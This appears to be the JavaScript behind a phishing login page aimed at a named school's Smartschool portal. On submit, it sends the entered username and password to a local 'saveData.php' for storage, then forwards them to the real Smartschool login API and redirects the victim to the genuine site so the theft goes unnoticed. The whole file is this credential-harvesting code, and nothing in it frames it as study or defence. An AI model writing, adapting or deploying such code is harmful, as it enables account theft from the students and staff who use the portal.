function submitForm(event) {
    event.preventDefault(); // Empêche le rechargement de la page

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const data = {
        username: username,
        password: password
    };

    // Save data to saveData.php
    fetch('saveData.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.text())
    .then(data => {
        console.log('Données envoyées avec succès:', data);
    })
    .catch(error => {
        console.error('Erreur:', error);
    });

    // Login to Smartschool
    fetch('https://ebr-secondaire.smartschool.be/api/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            username: username,
            password: password
        })
    })
    .then(response => {
        console.log('Réponse de l\'API:', response);
        if (response.redirected) {
            window.location.href = response.url; // Handle redirection
        } else {
            return response.json();
        }
    })
    .then(data => {
        console.log('Données de l\'API:', data);
        if (data && data.success) {
            console.log('Connexion réussie', data);
            // Rediriger vers Smartschool après une connexion réussie
            window.location.href = 'https://ebr-secondaire.smartschool.be';
        } else if (data) {
            console.error('Erreur de connexion', data.message);
            // Afficher un message d'erreur
        }
    })
    .catch(error => console.error('Erreur:', error));
}
